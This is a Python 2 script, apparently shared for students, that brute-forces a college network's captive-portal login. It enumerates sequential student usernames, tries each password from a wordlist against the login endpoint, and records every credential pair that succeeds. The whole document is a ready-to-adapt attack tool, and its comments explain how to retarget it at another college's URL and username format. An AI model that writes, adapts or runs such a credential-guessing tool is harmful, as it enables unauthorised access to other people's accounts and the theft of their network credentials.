#Replace the URL in 'get =' to the URL used in your college!
#Replace the user_name(u12me) with the format used in your college!
#You can edit the file passwordlist.txt to add you own custom passwords!
#usernumber_min = Set it to the number where the serial number start. (if u12me001 then set usernumber_min=1)
#usernumber_max = Set it to the number where the serial number start. (if u12me200 then set usernumber_min=200)

import urllib
import os
import sys
import time

user_list = open("userlist.txt","a")
pass_list = open("passwordlist.txt","r")
user_name = "u12me"

flag = True
usernumber_min = 1
usernumber_max = 200


while flag :

	pass_file_read = pass_list.readline()
	#--------------------------------------------------------------------------------
	#--------------------------------------------------------------------------------
	if pass_file_read == '':
		flag = False
		print 'End of File'
		sys.exit()
	#--------------------------------------------------------------------------------
	#--------------------------------------------------------------------------------
	passwd = pass_file_read[:-1]
	print 'Password: ',passwd
	#--------------------------------------------------------------------------------
	#--------------------------------------------------------------------------------
	while usernumber_min <= usernumber_max :
		#----------------------------------------------------------------------------
		#----------------------------------------------------------------------------		
		if usernumber_min <= 9:
			print 'Checking User: ' + user_name + '00' + str(usernumber_min)
		elif usernumber_min >= 10 and usernumber_min <= 99 :
			print 'Checking User: ' + user_name + '0' + str(usernumber_min)
		else :
			print 'Checking User: ' + user_name + str(usernumber_min)
		#----------------------------------------------------------------------------
		#----------------------------------------------------------------------------
		if usernumber_min <= 9:
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+user_name+"00"+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
		elif usernumber_min >= 10 and usernumber_min <= 99 :
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+user_name+"0"+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
		else :
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+user_name+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")
		#----------------------------------------------------------------------------
		#----------------------------------------------------------------------------
		code = get.readlines(5)
		str1 = code[0]
		return_value = str1.find("in")
		#----------------------------------------------------------------------------
		#----------------------------------------------------------------------------
		if return_value != -1:
			print '--->Username: ',usernumber_min
			user_list.write('Username: '+str(usernumber_min)+' Password:'+passwd)
			user_list.write("\n")
		usernumber_min = usernumber_min  + 1
	
	time.sleep(5)
	usernumber_min = 1
pass_list.close()
